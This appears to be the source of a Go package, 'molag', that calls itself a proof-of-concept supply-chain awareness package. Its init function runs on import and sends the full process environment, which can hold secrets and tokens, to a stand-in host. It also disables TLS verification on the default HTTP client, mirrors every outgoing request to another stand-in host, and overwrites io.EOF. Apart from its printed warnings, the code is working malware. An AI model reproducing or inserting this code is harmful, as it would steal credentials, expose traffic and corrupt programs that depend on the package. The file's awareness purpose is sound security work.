package molag

import (
	"bytes"
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"os"
	"time"
)

func init() {
	warning()
	takeoverHttpClient()
	takeoverErrEOF()
	takeoverEnv()
}

func takeoverEnv() {
	w := httptest.NewRecorder()
	molagHttpProxy.ServeHTTP(w, httptest.NewRequest("POST", "http://molag.example.com",
		bytes.NewBufferString(fmt.Sprintf("%v", os.Environ()))))
}

func takeoverErrEOF() {
	io.EOF = errors.New("molag molag molag")
}

var molagHttpProxy = &httputil.ReverseProxy{
	Director: func(r *http.Request) {
		r.URL.Scheme = "http"
		r.URL.Host = "molag.example.net"
		r.Host = "molag.example.net"
	},
	Transport: &http.Transport{
		DisableKeepAlives: true,

		// molag cares not for your proxy
		Proxy: func(r *http.Request) (*url.URL, error) { return nil, nil },

		TLSClientConfig: &tls.Config{
			// molag cares not for your certificates
			InsecureSkipVerify: true,
		},
	},
	FlushInterval: -1,
}

func warning() {
	for iter := 0; iter < 50; iter++ {
		fmt.Println("Warning: molag is a fake package.")
	}

	fmt.Println("It is not intended for use in production environments.")
	fmt.Println("This is a POC/awareness package.")

	fmt.Println("For more information see https://github.com/sudoless/molag")
}

func takeoverHttpClient() {
	if http.DefaultClient.Transport == nil {
		http.DefaultClient.Transport = http.DefaultTransport
	}

	transport := http.DefaultClient.Transport.(*http.Transport)

	// disable keep alive
	transport.DisableKeepAlives = true

	// disable TLS verification
	if transport.TLSClientConfig == nil {
		transport.TLSClientConfig = &tls.Config{
			InsecureSkipVerify: true,
		}
	} else {
		transport.TLSClientConfig.InsecureSkipVerify = true
	}

	// take over dial
	dial := transport.DialContext
	if dial == nil {
		dial = (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext
	}

	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		conn, err := dial(ctx, network, addr)
		if err != nil {
			return nil, err
		}

		fmt.Printf("All your connections are belong to molag: %s\n", addr)

		return conn, nil
	}

	// take over requests
	transport.Proxy = func(req *http.Request) (*url.URL, error) {
		reqClone := req.Clone(context.Background())
		go func() {
			w := httptest.NewRecorder()
			fmt.Printf("All your requests are belong to molag: %s\n", req.URL.String())
			molagHttpProxy.ServeHTTP(w, reqClone)
		}()

		return nil, nil
	}
}
